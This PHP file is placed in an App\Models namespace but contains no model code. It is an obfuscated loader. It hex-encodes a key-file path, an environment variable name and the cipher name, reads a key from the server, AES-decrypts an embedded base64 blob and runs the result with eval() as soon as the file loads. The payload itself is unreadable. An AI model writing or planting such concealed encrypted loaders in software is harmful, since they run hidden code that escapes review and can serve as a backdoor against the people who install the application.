<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('wNLOtagifWb8MjUgEMArtw==');

$c=base64_decode(

'OmRMEV2gqA0Pz+VcuvP8U5wpVFg7pSG6Z8n0WdZsaekmpSWpC4q/ZVNte39OYbOJuoVxuOUIhHLF' .
'322jp67UURcRQAQ5yaRc0UigfodqcLC/fy/YADvuJrp7UXhwR+Hr2XsqbMIszXJhOz0JVgH9xDn8' .
'wRen+RydSNKAYp7Pnz0AHqYK5AZMQ25f2DgBfKhel36fsfNjYHjk4L1wRQ9yZxbH6UCkSE5FW86b' .
'WRDP5fkRVAWYMCU1ClcaJWW+RscQoaxzi+3vlLiyE34QtDNvNik/Qz5Fiw6wFco1INNl+fckSWIk' .
'vl/n3IKLNu7xiCWFE1LCRnRGvFo+8y49zU73GVxNM2oN+laq82dWi4Te8K4cb15DMsM4GvYpyX/n' .
'nlPfMBjMeBz8tOGAyTzG2f8Kj2LTZodO895uGux8gh96nrV50DrBHCR8f5Sy5snKx3Bpqo9VeSq6' .
'Rf8OQEPquzSZVKztgpCuKwmJNieXFBb5IBeZp9vdMQqSg6hvHR4v+7KsluAjN2XPvOkNdyk/8Nij' .
'GipZwG+ccjnpzqJNeJRSwXuOphz9/sGkOm2aPK+kqdaRcHVNtl+wheGvxltNTS1cni5RC0L9iRuK' .
'WJYbpuHur2oF5CHVyLZtcl+HvV2ntIcwLQ94pD0NKbfc6kW/bi2wvtMO+3SaomplF/EKp4Wm6ids' .
'AeSboF5HPC5Y9XL2W7zl/kpEkjmAfO95LjS1kl9XFjHPm7ny3mReAmgJAoS7GgWaoX7EWxFaGiwZ' .
'4JBrEngCG4h0oW4fVwLkWLAHpAOuDYyLHqv1ygFyiIl0sX0+MDdlYIdDbu71Xn98AHrNUEf2zbyu' .
'oVg6IvFwsvLN0KAbvZDlk7JuIzLJPLnxtCRPU3AZN64VktK/6xSVtpicLk1oDHQ7Jb0KoUEg8AJI' .
'RDN33cWQOu7V/mCZ3pGtP6wDcdIfiJjNAYonw2Iq1pF1EyG6ijxtCZsdlfUZi4sQoLKl7MZdAQ1Y' .
'+aKoc6Dn1XldhjpcTaUq2m8Zn0JLRLFJEJv3Dk9a4Ujqozy3ty2Xcxdzpc23EsVGM+R1i5kvdspk' .
'/FzxApwrxSSX5hQ8wjZxrkFQxm4hj0MvgbUyzzOnCjKcdarHMh3rVV28jSW6IyvlR61XLvl1sS5A' .
'zmqsFY9ryEffmgCj7287QE+P2xmlGQ2vKA+kSrBS51XxJfHp+vkyteIswHN3C1NaVWkWul6pOSRO' .
'RBl2Si4YePeUURtImW3UCg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

